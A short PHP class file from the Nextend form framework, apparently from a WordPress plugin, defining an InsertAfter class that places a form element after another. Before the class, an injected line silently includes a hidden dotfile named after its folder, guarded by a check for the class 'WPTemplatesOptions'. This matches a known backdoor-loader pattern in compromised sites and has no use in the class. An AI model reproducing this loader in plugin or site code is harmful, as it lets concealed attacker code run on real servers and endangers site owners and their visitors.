<?php


namespace Nextend\Framework\Form\Insert;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InsertAfter extends AbstractInsert {

    public function insert($element) {
        $parent = $this->at->getParent();
        $parent->insertElementAfter($element, $this->at);

        return $parent;
    }
}